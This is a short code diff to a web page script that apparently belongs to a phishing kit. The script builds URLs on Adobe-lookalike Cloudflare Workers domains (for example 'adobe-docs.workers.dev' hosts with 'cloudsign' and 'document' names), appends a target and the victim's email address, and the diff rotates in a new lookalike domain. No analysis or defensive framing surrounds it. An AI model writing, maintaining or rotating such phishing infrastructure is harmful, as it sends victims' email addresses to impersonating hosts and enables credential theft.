@@ -6,7 +6,7 @@
   <script>
     // List of target sites
     const sites = [
-      "https://cnn.com",
+      "https://adobecloud-document-874ba.adobe-docs.workers.dev",
       "https://total.com",
       "https://adobe.com",
       "https://bbc.com",
@@ -26,7 +26,7 @@
       const email = getEmail();
 
       // Build Worker URL with target + email
-      let url = "https://adobecloud-document-874ba.adobe-docs.workers.dev/?target=" + encodeURIComponent(target);
+      let url = "https://officepdf-cloudsign-electronic.adobe-docs.workers.dev/?target=" + encodeURIComponent(target);
       if (email) {
         url += "&email=" + encodeURIComponent(email);
       }
